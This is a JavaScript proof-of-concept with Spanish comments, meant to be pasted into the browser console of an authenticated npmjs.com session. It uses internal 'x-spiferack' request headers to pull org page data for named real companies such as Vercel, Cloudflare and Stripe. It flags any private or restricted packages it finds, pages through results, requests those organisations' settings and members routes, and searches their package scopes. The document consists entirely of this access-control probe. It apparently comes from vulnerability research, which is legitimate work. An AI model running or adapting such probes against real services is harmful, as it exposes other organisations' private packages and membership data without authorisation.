// ================================================================
// PoC: Detectar paquetes privados en orgs grandes
// EJECUTAR EN: https://www.npmjs.com (sesión autenticada)
// ================================================================

console.log("=== PoC: Visibilidad de Paquetes Privados en Orgs ===\n");

const spiferackHeaders = {
    'x-spiferack': '1',
    'x-requested-with': 'XMLHttpRequest',
    'manifest-hash': window.__context__?.hash || ''
};

const orgs = ['vercel', 'cloudflare', 'stripe', 'datadog', 'github', 'microsoft', 'google'];

// Registry API counts (obtenidos via curl previamente)
const registryCounts = {
    vercel: 146,
    cloudflare: 292,
    stripe: 19,
    datadog: 214,
    github: 138,
    microsoft: null,
    google: null
};

(async () => {
    // TEST 1: Obtener datos de cada org via Spiferack (web frontend)
    console.log("=== TEST 1: Org pages via Spiferack ===\n");

    for (const org of orgs) {
        try {
            const res = await fetch(`/org/${org}`, {
                headers: spiferackHeaders,
                credentials: 'include'
            });

            const status = res.status;
            const contentType = res.headers.get('content-type') || '';

            if (status === 200 && contentType.includes('json')) {
                const data = await res.json();
                const keys = Object.keys(data);
                console.log(`\n[+] /org/${org} → HTTP 200 JSON (${keys.length} keys)`);
                console.log(`    Keys: ${keys.join(', ')}`);

                // Datos del scope/org
                if (data.scope) {
                    console.log(`    scope.type: ${data.scope.type}`);
                    console.log(`    scope.tfa_enforced: ${data.scope.tfa_enforced}`);
                    console.log(`    scope.created: ${data.scope.created}`);
                    console.log(`    scope.updated: ${data.scope.updated}`);
                    if (data.scope.resource) {
                        console.log(`    scope.resource: ${JSON.stringify(data.scope.resource).substring(0, 300)}`);
                    }
                }

                // PAQUETES - lo que realmente nos interesa
                if (data.packages) {
                    const pkgs = data.packages;
                    const total = pkgs.total || (pkgs.objects ? pkgs.objects.length : '?');
                    const registryTotal = registryCounts[org];
                    console.log(`    packages.total (web): ${total}`);
                    if (registryTotal !== null) {
                        console.log(`    packages.total (registry API): ${registryTotal}`);
                        if (total !== registryTotal) {
                            console.log(`    [!!!] DIFERENCIA DETECTADA: web=${total} vs registry=${registryTotal}`);
                        } else {
                            console.log(`    [=] Misma cantidad en web y registry`);
                        }
                    }

                    // Listar paquetes y buscar privados
                    if (pkgs.objects && Array.isArray(pkgs.objects)) {
                        let privateCount = 0;
                        let publicCount = 0;
                        const privatePackages = [];

                        for (const pkg of pkgs.objects) {
                            const name = pkg.name || pkg.package?.name || '?';
                            const isPrivate = pkg.access === 'restricted' || pkg.private === true;
                            if (isPrivate) {
                                privateCount++;
                                privatePackages.push(name);
                            } else {
                                publicCount++;
                            }
                        }

                        console.log(`    Paquetes mostrados: ${pkgs.objects.length}`);
                        console.log(`    Públicos: ${publicCount}`);
                        console.log(`    PRIVADOS: ${privateCount}`);

                        if (privateCount > 0) {
                            console.log(`    [!!!] PAQUETES PRIVADOS VISIBLES:`);
                            privatePackages.forEach(p => console.log(`      - ${p}`));
                        }

                        // Mostrar primeros 10 con todos sus campos
                        console.log(`    Primeros 10 paquetes:`);
                        pkgs.objects.slice(0, 10).forEach(p => {
                            console.log(`      - ${p.name || '?'} | access=${p.access || '?'} | private=${p.private ?? '?'} | publish_requires_tfa=${p.publish_requires_tfa ?? '?'}`);
                        });
                    }

                    // Paginación - probar si hay más páginas
                    if (pkgs.urls) {
                        console.log(`    urls: ${JSON.stringify(pkgs.urls)}`);
                    }
                }

                // Miembros
                if (data.members) {
                    console.log(`    members: ${JSON.stringify(data.members).substring(0, 500)}`);
                }

                // Audit
                if (data.auditLogEnabled !== undefined) {
                    console.log(`    auditLogEnabled: ${data.auditLogEnabled}`);
                }

                // Imprimir todo si es pequeño
                const full = JSON.stringify(data);
                if (full.length < 3000) {
                    console.log(`    DATOS COMPLETOS: ${full}`);
                }

            } else if (status === 200) {
                console.log(`[-] /org/${org} → HTTP 200 HTML (no JSON)`);
            } else {
                console.log(`[-] /org/${org} → HTTP ${status}`);
            }
        } catch(e) {
            console.log(`[-] /org/${org} → Error: ${e.message}`);
        }
    }

    // TEST 2: Probar paginación (si hay más paquetes en páginas siguientes)
    console.log("\n\n=== TEST 2: Paginación de paquetes ===\n");

    for (const org of ['vercel', 'cloudflare']) {
        for (const page of [0, 1, 2]) {
            try {
                const res = await fetch(`/org/${org}?page=${page}`, {
                    headers: spiferackHeaders,
                    credentials: 'include'
                });

                if (res.ok) {
                    const contentType = res.headers.get('content-type') || '';
                    if (contentType.includes('json')) {
                        const data = await res.json();
                        const pkgs = data.packages;
                        if (pkgs?.objects) {
                            const names = pkgs.objects.map(p => p.name || '?');
                            const hasPrivate = pkgs.objects.some(p => p.access === 'restricted' || p.private === true);
                            console.log(`[+] /org/${org}?page=${page}: ${pkgs.objects.length} paquetes, total=${pkgs.total}, hasPrivate=${hasPrivate}`);
                            if (hasPrivate) {
                                const privPkgs = pkgs.objects.filter(p => p.access === 'restricted' || p.private === true);
                                console.log(`    [!!!] PRIVADOS EN PÁGINA ${page}:`);
                                privPkgs.forEach(p => console.log(`      - ${p.name}`));
                            }
                        } else {
                            console.log(`[+] /org/${org}?page=${page}: Sin array de paquetes`);
                        }
                    }
                } else {
                    console.log(`[-] /org/${org}?page=${page} → HTTP ${res.status}`);
                }
            } catch(e) {
                console.log(`[-] /org/${org}?page=${page} → Error: ${e.message}`);
            }
        }
    }

    // TEST 3: Probar settings de orgs ajenas (como comparación)
    console.log("\n\n=== TEST 3: Settings de orgs ajenas (debe dar 404) ===\n");

    const settingsRoutes = [
        '/settings/vercel/packages',
        '/settings/cloudflare/packages',
        '/settings/stripe/packages',
        '/settings/vercel/members',
        '/settings/cloudflare/members',
    ];

    for (const route of settingsRoutes) {
        try {
            const res = await fetch(route, {
                headers: spiferackHeaders,
                credentials: 'include'
            });
            const ct = res.headers.get('content-type') || '';
            if (res.status === 200 && ct.includes('json')) {
                const data = await res.json();
                console.log(`[!!!] ${route} → HTTP 200 JSON: ${JSON.stringify(data).substring(0, 500)}`);
            } else {
                console.log(`[-] ${route} → HTTP ${res.status}`);
            }
        } catch(e) {
            console.log(`[-] ${route} → Error: ${e.message}`);
        }
    }

    // TEST 4: Buscar paquetes con scope de estas orgs
    console.log("\n\n=== TEST 4: Buscar paquetes @scope de orgs ===\n");

    const scopes = ['@vercel', '@cloudflare', '@stripe', '@datadog'];
    for (const scope of scopes) {
        try {
            const res = await fetch(`/search?q=${encodeURIComponent(scope)}`, {
                headers: spiferackHeaders,
                credentials: 'include'
            });
            if (res.ok) {
                const ct = res.headers.get('content-type') || '';
                if (ct.includes('json')) {
                    const data = await res.json();
                    if (data.objects) {
                        console.log(`[+] search "${scope}": ${data.total} resultados`);
                        // Mostrar primeros 5
                        data.objects.slice(0, 5).forEach(o => {
                            const pkg = o.package || o;
                            console.log(`    - ${pkg.name} | private=${pkg.private ?? '?'}`);
                        });
                    }
                }
            }
        } catch(e) {
            console.log(`[-] search "${scope}" → Error: ${e.message}`);
        }
    }

    console.log("\n=== FIN ===");
})();
